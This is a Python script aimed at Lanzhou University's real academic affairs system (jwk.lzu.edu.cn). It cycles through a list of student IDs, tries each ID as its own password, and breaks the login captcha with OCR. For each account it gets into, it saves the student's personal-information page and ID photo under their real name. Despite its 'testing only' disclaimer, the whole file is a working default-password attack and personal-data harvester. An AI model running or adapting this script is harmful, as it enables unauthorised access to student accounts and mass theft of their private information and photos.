#coding = utf-8
# by 'hollowman6' from Lanzhou University(兰州大学)

'''
警告：
仅供测试使用，不可用于任何非法用途！
对于使用本代码所造成的一切不良后果，本人将不负任何责任！

Warning:
For TESTING ONLY, not for any ILLIGAL USE!
I will not be responsible for any adverse consequences caused by using this code.

'''

# 图像处理 Image processing
from PIL import Image
# 文件处理 File processing
import io
# 正则表达式搜索 Regular expression search
import re
# 使能够在命令行下输入密码 Enable Entering a password at the command line
import getpass
# 爬虫库导入 Import Spider
import requests
# 识别验证码 Captcha Verification
import pytesseract


# 按照阈值进行二值化处理 Binarization according to threshold
# threshold: 像素阈值
def get_bin_table(threshold):
    # 获取灰度转二值的映射table Mapping table for gray level to binary
    table = []
    for i in range(256):
        if i < threshold:
            table.append(0)
        else:
            table.append(1)
    return table


# 去掉二值化处理后的图片中的边缘噪声 Remove edge noise from binarized images
def cut_noise(image):

    rows, cols = image.size  # 图片的宽度和高度 Width and Height of Pictures
    position = []  # 噪声位置 Noise location

    # 遍历图片中的每个点，除掉边缘 Traverse through each point in the picture, removing the edges
    for i in range(68, rows):
        for j in range(0, cols):
            position.append((i, j))
    # 对相应位置进行像素修改，将噪声处的像素置为1（白色） Modify the corresponding position and set the noise pixel to 1 (white)
    for pos in position:
        image.putpixel(pos, 1)

    return image  # 返回修改后的图片 Return the modified image


# 识别图片中的数字 Recognition of Numbers in Pictures
# 传入参数为图片路径，返回结果为：识别结果 The input parameter is the picture path, and the return result is: recognition result
def OCR_lmj(img_path):

    image = Image.open(img_path)  # 打开图片文件 Open Picture File
    imgry = image.convert('L')  # 转化为灰度图 Conversion to gray scale image

    # 将图片进行二值化处理 Binarization of Pictures
    table = get_bin_table(140)
    out = imgry.point(table, '1')

    # 去掉图片中的噪声（孤立点） Remove noise (outliers) from the picture
    out = cut_noise(out)

    # 识别图片 Identifying pictures
    text = pytesseract.image_to_string(out)

    # 去掉识别结果中的特殊字符 Remove special characters from recognition results
    exclude_char_list = ''' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW€XYZ§。，；：£©®é¢™“”’‘￥~·.:\|'"?![],()~@#$%^&*_+-={};/¥'''
    text = ''.join([x for x in text if x not in exclude_char_list])
    return text


class qdujw:
    def __init__(self):
        # 伪装爬虫 Camouflage Spider
        self.userid = 0
        self.s = requests.Session()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36'
        }

    # 教务系统登录 Login STU-INFO System
    def login(self):
        global sid, passwd
        # 页面相关设置 Page Related Settings
        loginurl = 'http://jwk.lzu.edu.cn/academic/j_acegi_security_check'
        codeurl = 'http://jwk.lzu.edu.cn/academic/getCaptcha.do'
        userurl = 'http://jwk.lzu.edu.cn/academic/student/studentinfo/studentInfoModifyIndex.do?frombase=0&wantTag=0&groupId=&moduleId=2060'

        # 验证码 Captcha
        code = self.s.get(codeurl, headers=self.headers, stream=True)
        codetext = OCR_lmj(io.BytesIO(code.content))

        # 验证码识别长度符合要求 The length of captcha recognized is fitted
        if len(codetext) == 5:

            # 登录 Login
            postdata = {
                'j_username': sid,
                'j_password': passwd,
                'j_captcha': codetext
            }
            r = self.s.post(loginurl, postdata)

            # 验证码错误 Wrong Captcha
            if re.search(u'\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e', r.text):
                qdujw().login()

            # 验证码匹配成功 Captcha matched
            else:
                userpage = self.s.get(userurl).content
                gbcontent = str(userpage.decode('gb2312', 'ignore'))
                nw = open("latest.txt", 'w')
                nw.write(sid)
                if "权限不够,访问被拒绝" in gbcontent:  # Refuse to access
                    print(sid+"失败！")  # Fail
                else:
                    imageid = ''.join(re.findall(
                        r'"/academic/manager/studentinfo/showStudentImage.jsp?id=(.+?)"', gbcontent))
                    imagepage = "http://jwk.lzu.edu.cn/academic/manager/studentinfo/showStudentImage.jsp?id="+imageid
                    name = ''.join(re.findall(r'name="realname" value="(.+?)"',
                                              str(userpage.decode('utf-8', 'ignore'))))
                    image = self.s.get(imagepage).content
                    # 写入文件 Write file
                    wf = open("data/"+name+sid.replace("\n", '')+'.html', 'wb')
                    wi = open("data/"+name+sid.replace("\n", '')+'.jpg', 'wb')
                    fw = open("success.txt", 'a')
                    wf.write(userpage)
                    wi.write(image)
                    fw.write(sid)
                    wi.close()
                    wf.close()
                    fw.close()
                    print(sid+"成功！已保存到本地！")  # Success, saved locally
                nw.close()
        else:
            qdujw().login()


# 打开数据文件 Open data files
f = open("list.txt")
line = f.readline()
while line:
    sid = line
    passwd = line
    try:
        qdujw().login()
    except Exception:
        pass
    line = f.readline()
f.close()